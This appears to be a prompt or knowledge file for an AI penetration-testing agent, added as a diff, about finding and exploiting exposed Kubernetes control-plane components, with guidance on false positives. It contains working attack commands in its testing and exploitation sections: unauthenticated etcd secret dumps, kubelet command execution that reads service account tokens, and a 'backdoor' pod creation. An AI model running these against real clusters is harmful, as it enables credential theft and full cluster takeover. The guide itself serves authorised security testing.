@@ -1,0 +1,246 @@
+<k8s_control_plane_exposure_guide>
+<title>KUBERNETES CONTROL PLANE EXPOSURE</title>
+
+<critical>Exposed Kubernetes control plane components enable direct cluster compromise without application-level exploitation. Unauthenticated API server access, exposed dashboards, unprotected etcd, and accessible kubelet APIs provide paths to full cluster takeover. Control plane exposure is critical severity as it bypasses all application and workload security controls.</critical>
+
+<scope>
+- API server: Unauthenticated or weakly authenticated access to Kubernetes API (6443/tcp)
+- etcd: Direct access to cluster state database (2379/tcp, 2380/tcp)
+- Kubernetes Dashboard: Web UI with excessive permissions or no authentication
+- Kubelet: Node agent API with command execution (10250/tcp, 10255/tcp)
+- Metrics endpoints: Prometheus, metrics-server with sensitive data (/metrics)
+- Controller manager: Internal component with cluster-admin equivalent (10257/tcp)
+- Scheduler: Internal component (10259/tcp)
+- Cloud controller manager: Cloud integration with credentials (10258/tcp)
+</scope>
+
+<methodology>
+1. Identify control plane endpoints (ports, URLs, IPs) through network scanning or configuration review.
+2. Test for unauthenticated access to each exposed endpoint.
+3. Verify authentication weaknesses (anonymous access, weak tokens, default credentials).
+4. Demonstrate actual cluster impact (read secrets, execute pods, modify resources).
+5. Document the specific exposure and required network position to exploit.
+6. Assess whether exposure is internal-only or internet-facing.
+</methodology>
+
+<discovery_techniques>
+<network_scanning>
+- Common ports:
+  - 6443: API server (HTTPS)
+  - 2379, 2380: etcd client and peer
+  - 10250: Kubelet HTTPS API
+  - 10255: Kubelet read-only (deprecated)
+  - 8443, 443: Dashboard
+  - 9090: Prometheus
+  - 8080: API server insecure port (deprecated, dangerous)
+- Scan: `nmap -sV -p 6443,2379,2380,10250,10255,8443,443,9090,8080 TARGET`
+</network_scanning>
+
+<api_server_testing>
+- Check anonymous access: `curl -k https://API_SERVER:6443/api/v1/namespaces/default/pods`
+- Version info (often accessible): `curl -k https://API_SERVER:6443/version`
+- API discovery: `curl -k https://API_SERVER:6443/apis`
+- With anonymous auth: `kubectl --insecure-skip-tls-verify --server=https://API_SERVER:6443 auth can-i --list`
+- Check system:anonymous bindings: Look for RBAC granting permissions to anonymous
+</api_server_testing>
+
+<etcd_testing>
+- Check connection: `etcdctl --endpoints=http://ETCD_IP:2379 endpoint health`
+- List keys: `etcdctl --endpoints=http://ETCD_IP:2379 get / --prefix --keys-only`
+- Read secrets: `etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets --prefix`
+- If TLS required but weak: Try without client certs, self-signed, or leaked certs
+</etcd_testing>
+
+<kubelet_testing>
+- List pods on node: `curl -k https://NODE_IP:10250/pods`
+- Execute command: `curl -k https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER -d "cmd=id"`
+- Read-only port (deprecated): `curl http://NODE_IP:10255/pods`
+- Check anonymous auth: Most managed clusters disable this, test anyway
+</kubelet_testing>
+
+<dashboard_testing>
+- Default locations: `/dashboard`, `/`, port 8443 or 443
+- Check for skip login: Look for "Skip" button or token not required
+- Default credentials: Check documentation for default setup
+- Token from URL: Some dashboards expose tokens in URL parameters
+- RBAC binding: Check if dashboard service account has cluster-admin
+</dashboard_testing>
+
+<metrics_endpoints>
+- Prometheus: `curl http://PROMETHEUS:9090/metrics` or `/api/v1/query?query=up`
+- Metrics server: Check for exposed /metrics on various components
+- Sensitive data in metrics: Secrets, resource names, pod details
+- pprof endpoints: `/debug/pprof` on control plane components
+</metrics_endpoints>
+</discovery_techniques>
+
+<exploitation>
+<anonymous_api_access>
+If API server allows anonymous:
+1. List resources: `kubectl --server=https://API_SERVER:6443 get pods --all-namespaces`
+2. Read secrets: `kubectl --server=https://API_SERVER:6443 get secrets --all-namespaces`
+3. Create backdoor: `kubectl --server=https://API_SERVER:6443 create -f backdoor-pod.yaml`
+4. Check what permissions anonymous has: May be limited
+</anonymous_api_access>
+
+<etcd_exploitation>
+If etcd is accessible:
+1. Read all secrets: `etcdctl get /registry/secrets --prefix`
+2. Read service account tokens: Look for token secrets
+3. Modify cluster state: Dangerous, can break cluster
+4. Extract admin credentials: Search for cluster-admin tokens
+5. Read encryption keys: If secrets encrypted, keys may be in etcd config
+</etcd_exploitation>
+
+<kubelet_exploitation>
+If kubelet API is accessible:
+1. List all pods: `curl -k https://NODE:10250/pods`
+2. Execute in any container: `curl -k https://NODE:10250/run/NS/POD/CONTAINER -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"`
+3. Read container logs: `curl -k https://NODE:10250/containerLogs/NS/POD/CONTAINER`
+4. Pivot using high-privilege pod tokens
+</kubelet_exploitation>
+
+<dashboard_exploitation>
+If dashboard is accessible:
+1. Login without credentials if skip enabled
+2. Access Secrets section to read cluster secrets
+3. Create workloads to gain persistent access
+4. Execute in pods directly from UI
+5. Modify deployments for backdoor insertion
+</dashboard_exploitation>
+</exploitation>
+
+<validation>
+1. Demonstrate successful unauthenticated or weakly authenticated access.
+2. Show actual data retrieval or command execution, not just connectivity.
+3. Document the network position required (internal, internet-facing).
+4. Verify the access provides meaningful cluster impact.
+5. Check if this is managed Kubernetes where control plane is expected to be exposed (but still authenticated).
+6. Confirm the exposure is not a honeypot or intentional test environment.
+</validation>
+
+<false_positives>
+- API server exposed but properly authenticated (intended for kubectl access)
+- Metrics endpoints with only non-sensitive data
+- Internal-only exposure within secure network
+- Managed Kubernetes with cloud-provider authentication
+- Dashboard with proper RBAC limiting access
+- Components requiring client certificates that aren't available
+</false_positives>
+
+<llm_reasoning_errors>
+COMMON AI MISTAKES THAT CAUSE FALSE POSITIVES - AVOID THESE:
+
+1. EXPOSED VS ACCESSIBLE:
+   WRONG: "API server on port 6443 detected, control plane exposed"
+   RIGHT: API server is DESIGNED to be network accessible for kubectl:
+          - This is not a vulnerability
+          - The question is: Is it AUTHENTICATED properly?
+          - Test for anonymous access, not just port availability
+          Exposure requires authentication weakness, not just reachability.
+
+2. MANAGED KUBERNETES MISUNDERSTANDING:
+   WRONG: "EKS/GKE/AKS API server is internet-facing, critical exposure"
+   RIGHT: Managed Kubernetes control planes are:
+          - Internet-accessible by design for cloud-based kubectl
+          - Authenticated via cloud IAM integration
+          - Not vulnerable just because they're reachable
+          Test authentication, not just network access.
+
+3. METRICS SENSITIVITY OVERESTIMATION:
+   WRONG: "Prometheus /metrics endpoint exposed, sensitive data leaked"
+   RIGHT: Most metrics are operational, not security-sensitive:
+          - CPU, memory, request counts
+          - Pod names (often discoverable anyway)
+          - Generic cluster statistics
+          Report only if metrics contain ACTUAL secrets or auth data.
+
+4. INTERNAL EXPOSURE AS CRITICAL:
+   WRONG: "etcd accessible from within cluster, critical vulnerability"
+   RIGHT: Internal accessibility must be contextualized:
+          - Some components need to reach etcd
+          - Internal exposure may require prior compromise
+          - Network policies may restrict actual access
+          Clarify the required attack position.
+
+5. DEPRECATED FEATURES NOT PRESENT:
+   WRONG: "Kubelet read-only port (10255) is a common vulnerability"
+   RIGHT: Modern Kubernetes defaults:
+          - Read-only port disabled since 1.10+
+          - Most managed clusters never enable it
+          - Don't assume it exists; verify
+          Test actual accessibility, don't assume based on old documentation.
+
+6. VERSION INFO AS VULNERABILITY:
+   WRONG: "API server /version endpoint accessible, information disclosure"
+   RIGHT: Version endpoint is typically public:
+          - Designed for client compatibility checking
+          - Contains no secrets
+          - Not a security vulnerability
+          Focus on authenticated endpoints, not version info.
+</llm_reasoning_errors>
+
+<expanded_false_positives>
+FALSE POSITIVE SCENARIOS - DO NOT REPORT:
+
+1. PROPERLY AUTHENTICATED ACCESS:
+   - API server reachable but requires valid kubeconfig
+   - OIDC integration requiring identity provider login
+   - Cloud IAM (AWS IAM Authenticator, GKE GCP auth)
+   - Client certificate authentication enforced
+
+2. MANAGED KUBERNETES DESIGN:
+   - EKS endpoint policy allowing public (with IAM auth)
+   - GKE private cluster with authorized networks
+   - AKS with Azure AD integration
+   - Control plane managed by cloud provider
+
+3. NON-SENSITIVE ENDPOINTS:
+   - /version returning version info only
+   - /healthz liveness probes
+   - OpenAPI schemas (/openapi/v2)
+   - Non-sensitive metrics (request counts, latencies)
+
+4. INTERNAL-ONLY EXPOSURE:
+   - etcd only accessible from control plane nodes
+   - Kubelet only from within VPC
+   - Dashboard behind VPN/bastion
+   - Prometheus on internal network only
+
+5. AUTHENTICATION REQUIRED BUT NOT TESTED:
+   - Assuming unauthenticated when you didn't test
+   - Endpoints that return 401/403 on access
+   - TLS client cert required (and you don't have it)
+
+6. HONEYPOTS AND DECOYS:
+   - Intentionally exposed fake clusters
+   - Security research/training environments
+   - Canary clusters for detection
+</expanded_false_positives>
+
+<impact>
+- Full cluster takeover without application exploitation
+- Direct secret extraction from etcd or API
+- Remote code execution via kubelet on any node
+- Cluster destruction or ransomware
+- Supply chain attacks via workload modification
+- Persistence through RBAC and service account manipulation
+- Cloud account compromise via cloud-provider credentials
+- Data exfiltration from all namespaces
+</impact>
+
+<pro_tips>
+1. Always test authentication, not just network reachability.
+2. etcd encryption at rest doesn't help if you have network access to etcd.
+3. Kubelet anonymous auth is disabled by default since 1.10; verify the actual config.
+4. Dashboard in modern versions requires explicit RBAC; check the service account permissions.
+5. API server audit logs may capture your requests; be aware of detection.
+6. Cloud-managed control planes often have additional auth layers beyond Kubernetes RBAC.
+7. Some scanners generate false positives on /version endpoints; focus on authenticated resources.
+8. Check for --anonymous-auth=true on API server arguments.
+9. etcd peer port (2380) allows cluster membership changes; also dangerous.
+10. Metrics endpoints sometimes expose more than expected (process cmdline, environment).
+</pro_tips>
+
+<remember>Control plane exposure requires demonstrating unauthenticated or weakly authenticated access that enables cluster compromise. Network reachability alone is not a vulnerability - the API server is meant to be accessible. Validate actual authentication bypass and demonstrate meaningful impact.</remember>
+</k8s_control_plane_exposure_guide>
